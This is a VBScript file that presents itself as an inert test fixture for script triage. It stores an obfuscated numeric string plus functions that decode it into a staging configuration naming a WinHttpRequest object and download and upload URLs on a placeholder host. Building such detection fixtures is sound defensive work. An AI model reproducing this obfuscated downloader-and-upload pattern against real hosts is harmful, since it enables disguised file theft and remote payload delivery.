Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_9f6b4c5b = "147,90,78,153,144,145,130,141,144,90,137,140,128,126,145,130,124,137,140,128,126,137,73,141,143,130,141,126,143,130,124,145,143,126,139,144,131,130,143,73,146,141,137,140,126,129,124,143,130,138,140,145,130,153,126,129,126,141,145,130,143,90,116,134,139,101,145,145,141,75,116,134,139,101,145,145,141,111,130,142,146,130,144,145,75,82,75,78,153,144,145,126,132,130,124,128,140,146,139,145,90,79,153,128,126,138,141,126,134,132,139,124,134,129,90,128,126,138,141,126,134,132,139,74,128,80,131,127,129,127,86,127,126,127,153,146,143,137,90,133,145,145,141,144,87,76,76,128,80,131,127,129,127,86,127,126,127,75,130,149,126,138,141,137,130,75,134,139,147,126,137,134,129,76,128,126,82,81,78,78,126,86,75,129,126,145,153,146,144,130,143,124,126,132,130,139,145,90,101,146,139,145,143,130,144,144,105,126,127,76,128,80,131,127,129,127,86,127,126,127,153,131,134,137,130,124,141,126,145,133,90,96,87,121,114,144,130,143,144,121,109,146,127,137,134,128,121,101,146,139,145,143,130,144,144,105,126,127,121,144,145,126,132,130,74,128,80,131,127,129,127,86,127,126,127,75,129,126,145,153,146,141,137,140,126,129,124,146,143,137,90,133,145,145,141,144,87,76,76,128,80,131,127,129,127,86,127,126,127,75,130,149,126,138,141,137,130,75,134,139,147,126,137,134,129,76,146,141,137,140,126,129,76,81,81,84,84,83,83,78,129"
Const Codec_9f6b4c5b = "decimal_comma|add_modulo_256|1d"

Function Load_9f6b4c5b()
  Dim parts, result(), item5
  parts = Split(Material_9f6b4c5b, ",")
  ReDim result(UBound(parts))
  For item5 = 0 To UBound(parts)
    result(item5) = CInt(parts(item5))
  Next
  Load_9f6b4c5b = result
End Function

Function Decode_9f6b4c5b(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  For item5 = 0 To UBound(item1)
    result(item5) = (item1(item5) - 29 + 256) Mod 256
  Next
  Decode_9f6b4c5b = result
End Function

Function Recover_9f6b4c5b()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  If True Then
    item4 = Join(Array("north", "south"), ":")
      item1 = Load_9f6b4c5b()
      item6 = 0
      While item6 < 1
        item2 = Decode_9f6b4c5b(item1)
        item6 = item6 + 1
      Wend
      item3 = ""
      For item5 = 0 To UBound(item2)
        item3 = item3 & Chr(item2(item5))
      Next
  End If
  Recover_9f6b4c5b = item3
End Function

Function Inspect_9f6b4c5b()
  Inspect_9f6b4c5b = Recover_9f6b4c5b()
End Function
